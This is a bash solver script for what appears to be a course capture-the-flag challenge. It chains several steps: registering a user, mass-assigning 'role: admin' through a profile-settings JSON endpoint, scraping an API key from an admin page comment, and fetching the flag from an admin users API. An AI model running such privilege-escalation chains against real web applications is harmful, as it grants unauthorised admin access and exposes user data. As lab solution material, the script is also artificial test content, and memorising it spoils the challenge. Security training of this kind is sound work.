#!/usr/bin/env bash
# Vuln 5: Broken Access Control — Mass Assignment + IDOR privilege escalation
#
# Chain:
#   Step 1: Register a normal user account
#   Step 2: Mass-assign role=admin via POST /api/profile/settings JSON endpoint
#           (the endpoint blindly applies all JSON keys to the User model)
#   Step 3: Access /admin dashboard → extract API key from HTML comment
#   Step 4: GET /admin/users?api_key=<extracted_key> → flag in admin_token
#
# Inspired by CVE-2024-29400 (mass assignment in web frameworks)
#
URL="${1:-http://localhost}"

COOKIE_JAR="$(mktemp)"
trap 'rm -f "$COOKIE_JAR"' EXIT

# Step 1: Register a throwaway user
RAND_USER="solver_$$"
curl -sf -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST \
  -d "username=${RAND_USER}&password=solver_pass" \
  "${URL}/register" -o /dev/null -L 2>/dev/null

# Login
curl -sf -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST \
  -d "username=${RAND_USER}&password=solver_pass" \
  "${URL}/login" -o /dev/null -L 2>/dev/null

# Step 2: Mass assignment — promote self to admin role
curl -sf -b "$COOKIE_JAR" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"bio": "hacked", "role": "admin"}' \
  "${URL}/api/profile/settings" -o /dev/null 2>/dev/null

# Step 3: Access admin dashboard and extract API key from HTML comment
ADMIN_PAGE=$(curl -sf -b "$COOKIE_JAR" "${URL}/admin" 2>/dev/null)
API_KEY=$(echo "$ADMIN_PAGE" | grep -oP 'api_key: \K[a-f0-9]+' | head -1)

# Step 4: Hit the protected admin users API with the extracted key
RESP=$(curl -sf -b "$COOKIE_JAR" "${URL}/admin/users?api_key=${API_KEY}" 2>/dev/null)
echo "$RESP" | grep -oE 'ENPM634\{[^}]+\}' | head -1
